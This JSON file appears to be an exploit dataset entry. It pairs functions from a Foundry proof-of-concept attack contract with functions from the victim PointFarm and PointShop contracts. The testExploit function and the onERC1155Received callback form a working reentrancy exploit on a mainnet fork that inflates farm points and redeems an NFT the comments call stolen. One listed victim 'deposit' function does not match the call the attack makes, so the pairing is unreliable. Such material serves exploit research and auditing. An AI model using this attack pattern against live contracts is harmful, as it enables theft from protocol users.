[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "onERC1155Received",
    "original_code": "    function onERC1155Received(\n        address operator,\n        address from,\n        uint256 id,\n        uint256 value,\n        bytes calldata data\n    ) external returns (bytes4) {\n        uint256 pointFarmBalance = PointFarm.balanceOf(address(this), 0);\n        if (pointFarmBalance <= 10_000) {\n            PointFarm.deposit(0, 0);\n        }\n        return this.onERC1155Received.selector;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "onERC721Received",
    "original_code": "    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 18_133_171);\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(uJENNY), \"uJENNY\");\n        vm.label(address(uJENNY_WETH), \"uJENNY_WETH\");\n        vm.label(address(PointFarm), \"PointFarm\");\n        vm.label(address(PointShop), \"PointShop\");\n        vm.label(address(Realm), \"Realm\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        // Start with the below amount of WETH\n        deal(address(WETH), address(this), 500e15);\n        // Preparation phase\n        uJENNY.approve(address(PointFarm), type(uint256).max);\n        WETHToUJENNY();\n        uint256 amtuJENNY = uJENNY.balanceOf(address(this));\n        PointFarm.deposit(0, uJENNY.balanceOf(address(this)));\n        // Wait ~2 days\n        vm.roll(18_149_401);\n        // Attack\n        emit log_named_uint(\"Attacker Realm NFT balance before attack\", Realm.balanceOf(address(this)));\n        // Reentrancy here. Inflate the attacker balance of PointFarm to redeem Realm NFT later from PointShop\n        PointFarm.deposit(0, 0);\n        // Getting initial deposit (preparation phase) back\n        PointFarm.withdraw(0, amtuJENNY);\n        UJENNYToWETH(amtuJENNY);\n\n        // Getting NFT from PointShop\n        PointFarm.setApprovalForAll(address(PointShop), true);\n        PointShop.redeem(address(uJENNY), 0);\n\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after attack\", WETH.balanceOf(address(this)), WETH.decimals()\n        );\n        // 4689 - id of the stolen NFT\n        assertEq(Realm.ownerOf(4689), address(this));\n        emit log_named_uint(\"Attacker Realm NFT balance after attack\", Realm.balanceOf(address(this)));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPointFarm",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPointFarm",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "    function deposit(uint256[] calldata tokenIDs, uint256[] calldata amounts, address contractAddr) external {\n        require(msg.sender == issuer, \"Converter: Only issuer can deposit\");\n        require(tokenIDs.length <= 50, \"Converter: A maximum of 50 tokens can be deposited in one go\");\n        require(tokenIDs.length > 0, \"Converter: You must specify at least one token ID\");\n\n        if (ERC165Checker.supportsInterface(contractAddr, 0xd9b67a26)){\n            IERC1155(contractAddr).safeBatchTransferFrom(msg.sender, address(this), tokenIDs, amounts, VALIDATOR);\n\n            for (uint8 i = 0; i < 50; i++){\n                if (tokenIDs.length == i){\n                    break;\n                }\n                nfts[currentNFTIndex++] = NFT(contractAddr, tokenIDs[i], amounts[i], false);\n            }\n        }\n        else if (ERC165Checker.supportsInterface(contractAddr, 0x80ac58cd)){\n            for (uint8 i = 0; i < 50; i++){\n                if (tokenIDs.length == i){\n                    break;\n                }\n                IERC721(contractAddr).transferFrom(msg.sender, address(this), tokenIDs[i]);\n                nfts[currentNFTIndex++] = NFT(contractAddr, tokenIDs[i], 1, false);\n            }\n        }\n\n        emit Deposited(tokenIDs, amounts, contractAddr);\n    }\n\n    // Function that locks NFT collateral and issues the uTokens to the issuer\n",
    "description": ""
  },
  {
    "contract/interface": "IPointFarm",
    "source_type": "victim_contract",
    "function_name": "setApprovalForAll",
    "original_code": "    function setApprovalForAll(address operator, bool approved) public virtual override {\n        require(_msgSender() != operator, \"ERC1155: setting approval status for self\");\n\n        _operatorApprovals[_msgSender()][operator] = approved;\n        emit ApprovalForAll(_msgSender(), operator, approved);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPointFarm",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint256 _pid, uint256 _amount) public {\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        require(user.amount >= _amount, \"withdraw: not good\");\n        updatePool(_pid);\n        uint256 pending = user.amount.mul(pool.accPointsPerShare).div(1e18).sub(user.rewardDebt);\n        if(pending > 0) {\n            bytes memory data;\n            _mint(msg.sender, _pid, pending, data);\n        }\n        if(_amount > 0) {\n            user.amount = user.amount.sub(_amount);\n            pool.uToken.safeTransfer(address(msg.sender), _amount);\n        }\n        user.rewardDebt = user.amount.mul(pool.accPointsPerShare).div(1e18);\n        emit Withdraw(msg.sender, _pid, _amount);\n    }\n\n    // Withdraw without caring about rewards. EMERGENCY ONLY.\n",
    "description": ""
  },
  {
    "contract/interface": "IPointShop",
    "source_type": "victim_contract",
    "function_name": "redeem",
    "original_code": "    function redeem(address _uToken, uint256 internalID) public {\n        PointFarm(farm).burn(msg.sender, PointFarm(farm).shopIDs(_uToken), nfts[_uToken][internalID].price);\n        NFT storage currentNFT = nfts[_uToken][internalID];\n        currentNFT.amount = 0;\n        if (ERC165Checker.supportsInterface(nfts[_uToken][internalID].contractAddr, 0xd9b67a26)){\n            IERC1155(nfts[_uToken][internalID].contractAddr).safeTransferFrom(address(this), msg.sender, nfts[_uToken][internalID].tokenId, nfts[_uToken][internalID].amount, VALIDATOR);\n        }\n        else {\n            IERC721(nfts[_uToken][internalID].contractAddr).transferFrom(address(this), msg.sender, nfts[_uToken][internalID].tokenId);\n        }\n    }\n\n",
    "description": ""
  }
]